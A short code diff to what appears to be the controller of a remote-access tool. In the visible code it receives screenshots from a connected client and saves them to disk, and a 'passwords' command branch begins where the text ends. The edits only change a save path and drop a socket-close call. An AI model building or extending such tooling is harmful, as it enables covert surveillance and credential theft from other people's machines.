@@ -4,8 +4,6 @@ import signal
 
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
-        global s
-        s.close()
         sys.exit(0)
 signal.signal(signal.SIGINT, signal_handler)
 
@@ -40,7 +38,7 @@ while 1:
     if cmd == "143": #screenshot
         size = getSizeOfCommand(client)
         data = client.recv(size)
-        f = open('/Users/matt/Desktop/pic.jpg','w')
+        f = open('C:\Users\Matt\Desktop\pic.jpg','w')
         f.write(data)
         f.close()
     elif cmd == "144": #passwords
